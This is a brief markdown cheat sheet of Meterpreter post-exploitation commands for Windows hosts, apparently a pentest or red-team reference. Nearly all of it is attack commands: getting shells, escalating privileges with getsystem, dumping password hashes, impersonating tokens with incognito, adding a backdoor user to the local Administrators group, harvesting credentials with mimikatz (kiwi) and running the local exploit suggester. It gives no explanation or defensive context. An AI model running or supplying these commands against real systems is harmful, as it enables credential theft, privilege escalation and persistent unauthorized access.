# windows meterpreter

## shell access (cmd & powershell)

1. for cmd.exe `shell`
2. for powershell
    1. `load powershell`
    2. `powershell_shell`

## windows specific commands

```bash
getuid
getsystem
getprivs

migrate <system-process>

hashdump
```

## incognito | [milkdevil/incognito2](https://github.com/milkdevil/incognito2)

```bash
load incognito
list_tokens [-u | -g]
impersonate_token "<token>"

# for better results
migrate <pid>
add_user <user> <pass>
add_localgroup Administrators <user>
```

## mimikatz

```bash
load kiwi
creds_all
```

## local exploit suggester

```bash
use post/multi/recon/local_exploit_suggester
set SESSION <>; run
```